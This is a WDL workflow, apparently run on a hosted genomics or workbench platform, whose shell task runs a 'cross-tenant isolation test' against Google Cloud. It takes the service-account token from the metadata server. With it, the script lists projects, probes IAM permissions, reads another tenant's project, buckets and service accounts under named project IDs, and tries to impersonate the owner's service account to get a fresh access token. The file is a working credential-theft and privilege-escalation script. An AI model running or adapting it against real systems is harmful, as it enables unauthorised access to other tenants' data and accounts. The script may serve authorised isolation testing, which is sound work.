version 1.0

workflow CrossTenantTest {
    call CheckAccess
}

task CheckAccess {
    command <<<
        echo "=== CROSS-TENANT ISOLATION TEST ==="
        echo "Date: $(date -u)"

        TOKEN=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
        PROJECT=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null)
        SA_EMAIL=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null)

        echo "=== 1. WHO AM I ==="
        echo "Project: $PROJECT"
        echo "SA: $SA_EMAIL"

        echo "=== 2. LIST ALL VISIBLE PROJECTS ==="
        curl -s --max-time 10 \
          "https://cloudresourcemanager.googleapis.com/v1/projects" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== 3. OUR PERMISSIONS ==="
        curl -s --max-time 10 -X POST \
          "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:testIamPermissions" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"permissions":["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","storage.buckets.list","storage.objects.list","storage.objects.get","storage.objects.create","iam.serviceAccounts.list","iam.serviceAccountKeys.create","batch.jobs.list","secretmanager.secrets.list"]}' 2>&1

        echo "=== 4. OWNER PROJECT INFO ==="
        curl -s --max-time 10 \
          "https://cloudresourcemanager.googleapis.com/v1/projects/wb-golden-plum-6731" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== 5. OWNER BUCKETS ==="
        curl -s --max-time 10 \
          "https://storage.googleapis.com/storage/v1/b?project=wb-golden-plum-6731" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== 6. READ OWNER BUCKET ==="
        curl -s --max-time 10 \
          "https://storage.googleapis.com/storage/v1/b/storage-papyge-wb-golden-plum-6731/o?maxResults=20" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== 7. OTHER PROJECT (wb-sparkly-turnip-3673) ==="
        curl -s --max-time 10 \
          "https://cloudresourcemanager.googleapis.com/v1/projects/wb-sparkly-turnip-3673" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== 8. OWNER SAs ==="
        curl -s --max-time 10 \
          "https://iam.googleapis.com/v1/projects/wb-golden-plum-6731/serviceAccounts" \
          -H "Authorization: Bearer $TOKEN" 2>&1

        echo "=== 9. IAM POLICY ==="
        curl -s --max-time 10 -X POST \
          "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:getIamPolicy" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{}' 2>&1

        echo "=== 10. IMPERSONATE OWNER SA ==="
        curl -s --max-time 10 -X POST \
          "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/pet-2778175469911ac304b8a@wb-golden-plum-6731.iam.gserviceaccount.com:generateAccessToken" \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' 2>&1

        echo "=== DONE ==="
    >>>

    output {
        File result = stdout()
    }

    runtime {
        docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine"
    }
}
